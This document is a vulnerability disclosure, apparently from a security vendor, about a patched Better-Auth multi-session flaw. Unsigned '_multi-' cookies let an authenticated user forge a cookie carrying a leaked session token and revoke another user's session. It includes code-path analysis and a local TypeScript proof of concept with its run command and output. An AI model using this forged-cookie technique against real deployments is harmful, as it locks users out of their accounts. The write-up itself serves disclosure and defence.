---
schema_version: "1.0.0"
document_id: "595fe18659aab9d7c624616cf98a9ae4e6376c009ed8b1ce197a79d83c89227b"
company_key: "yc-winfunc"
company: "winfunc"
source_id: "yc-winfunc-rss-7ebe4d6da681"
canonical_url: "https://winfunc.com/hacktivity/better-auth-multi-session-signout-ato"
published_at: "2025-01-01T00:00:00+00:00"
first_seen_at: "2026-07-20T23:21:05.938183+00:00"
fetched_at: "2026-07-28T20:58:25.712310+00:00"
content_hash: "sha256:6755285a8eb72d55eef2c5bd36ffb7471e5b41b7be8beeb7a22d423cf74d998f"
---

# Multi-session sign-out hook allows forged cookies to revoke arbitrary sessions

[Back to Hacktivity](https://winfunc.com/hacktivity)


### Status: Patched


This vulnerability has been verified as resolved and deployed.


Better-Auth


Medium


2025


# Multi-session sign-out hook allows forged cookies to revoke arbitrary sessions


## Summary


Multi-session sign-out hook allows forged cookies to revoke arbitrary sessions


The` multiSession` plugin's` /sign-out` after-hook (` packages/better-auth/src/plugins/multi-session/index.ts` ) blindly trusts every cookie whose name matches the` _multi-` pattern. The handler splits the first segment of each raw cookie value and forwards the resulting strings to` ctx.context.internalAdapter.deleteSessions(...)` without ever calling` ctx.getSignedCookie` or verifying an HMAC.


Because the Cookie header is entirely attacker-controlled, any authenticated user who learns another account's plain session token (via logs, backups, or database reads) can forge a` _multi-<victimToken>` cookie, send it alongside their own session cookie, and coerce the hook into deleting the victim's session. No signing secret or adapter credentials are required; the only prerequisite is knowledge of the token bytes.


**Status** : Reproduced locally with Bun 1.3.0 using the exploit PoC below, which selects the correct` /sign-out` after-hook and demonstrates the forged-cookie flow against the current head of` canary` .


### CVSS Score


Vector


N


Complexity


L


Privileges


L


User Interaction


N


Scope


C


Confidentiality


N


Integrity


H


Availability


H


CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:H


### Vulnerability Location


Source


Line 325


packages /better-auth


/src


/plugins


/multi-session


/index.ts


signOut_after_hook_handler()


Sink


Line 345


packages /better-auth


/src


/plugins


/multi-session


/index.ts


signOut_after_hook_handler()


## Source-to-Sink Analysis


1


packages/better-auth/src/plugins/multi-session/index.ts:325


Attacker-controlled Cookie header is read from the HTTP request during sign-out.


TYPESCRIPT


```text
const   cookieHeader = ctx. headers  ?. get  ( "cookie"  );


```


2


packages/better-auth/src/plugins/multi-session/index.ts:327


Cookie header is parsed into key/value pairs without validation.


TYPESCRIPT


```text
const   cookies =  Object  . fromEntries  ( parseCookies  (cookieHeader));


```


3


packages/better-auth/src/plugins/multi-session/index.ts:339


The first segment of the forged cookie value is treated as a session token.


TYPESCRIPT


```text
const   token = cookies[key]!. split  ( "."  )[ 0  ]!;


```


4


packages/better-auth/src/plugins/multi-session/index.ts:345


Collected tokens are submitted to the adapter, which deletes every referenced session.


TYPESCRIPT


```text
await   ctx. context  . internalAdapter  . deleteSessions  (ids);


```


5


packages/better-auth/src/db/internal-adapter.ts:669


The internal adapter treats the supplied strings as session tokens and removes matching records from the database.


TYPESCRIPT


```text
await    deleteManyWithHooks  ([{  field  :  Array  . isArray  (userIdOrSessionTokens) ?  "token"   :  "userId"  ,  value  : userIdOrSessionTokens,  operator  :  Array  . isArray  (userIdOrSessionTokens) ?  "in"   :  undefined   }],  "session"  ,  undefined  );


```


## Impact Analysis


### Critical Impact


The victim is forcibly logged out and cannot refresh their session until they authenticate again. Attackers can iterate over every token they harvest, achieving cross-account denial of service and undermining authorization guarantees for all tenants using the plugin.


### Attack Surface


Any Better-Auth deployment that enables the` multiSession` plugin (tested on repository` better-auth` , branch` canary` , Bun runtime via` bun run --conditions better-auth-dev-source` ).


### Preconditions


The attacker controls any authenticated session (their own account suffices) and can obtain another user's plain session token (log leakage, backups, or DB read access). No signing secret or adapter access is needed.


## Proof of Concept


### Environment Setup


Requirements: Node.js 18+, pnpm 9+, and Bun 1.3.0.


Install dependencies:


BASH


```text
git  clone   https://github.com/better-auth/better-auth.git
cd   better-auth
git checkout canary
pnpm install
bun --version   # 1.3.0


```


### Target Configuration


Save the PoC below as` force-signout.ts` . It imports the real` multiSession` plugin, locates the` /sign-out` after-hook, and supplies forged` _multi-` cookie values while simulating a valid session cookie:


TS


```text
import   { multiSession }  from    'packages/better-auth/src/plugins/multi-session'  ;
import    type   {  AuthMiddleware   }  from    'packages/core/src/api/index'  ;


const   plugin =  multiSession  ();
const   hook = plugin. hooks  . after  ?. slice  (). reverse  (). find  ( ( h  ) =>   h. matcher  ({  path  :  '/sign-out'   }  as    any  ));
const    deleteSessions   = ( tokenList  :  string  []  ) => {
console  . log  ( 'deleteSessions invoked with:'  , tokenList);
};


const   ctx = {
headers  :  new    Headers  ({
cookie  :  'better-auth.session_token=my-valid-session; better-auth.session_token_multi-target=TARGETTOKEN.fake'  ,
}),
context  : {
secret  :  'dummy-secret'  ,
authCookies  : {
sessionToken  : {
name  :  'better-auth.session_token'  ,
options  : {},
},
},
internalAdapter  : { deleteSessions },
},
getSignedCookie  :  async   ( name  :  string  ) => (name. includes  ( '_multi-'  ) ?  'TARGETTOKEN'   :  'my-valid-session'  ),
setCookie  :  () =>   {},
json  :  () =>   {},
}  as    unknown    as    Parameters  < AuthMiddleware  >[ 0  ];


if   (!hook) {
throw    new    Error  ( 'Sign-out hook not found'  );
}


( async   () => {
await   hook. handler  (ctx  as    any  );
})();


```


### Exploit Delivery


Execute the PoC with Bun so the` better-auth-dev-source` condition resolves to the TypeScript sources:


BASH


```text
bun run --conditions better-auth-dev-source force-signout.ts


```


### Outcome


The script reproduces the attack locally against` canary` : the forged` _multi-` cookie is treated as genuine, and the adapter is instructed to delete the attacker-chosen token (` TARGETTOKEN` ).


**Expected Response:**


TEXT


```text
deleteSessions invoked with: [ 'TARGETTOKEN' ]


```


## Run this level of analysis on your repo.


Winfunc traces source-to-sink paths, validates exploitability, and gives your team patch-ready remediation.


[Vulnerability Detection](https://winfunc.com/products/scanner/vulnerability-detection)


[View Patch PR Verify fix on GitHub](https://github.com/better-auth/better-auth/security/advisories/GHSA-wmjr-v86c-m9jj)
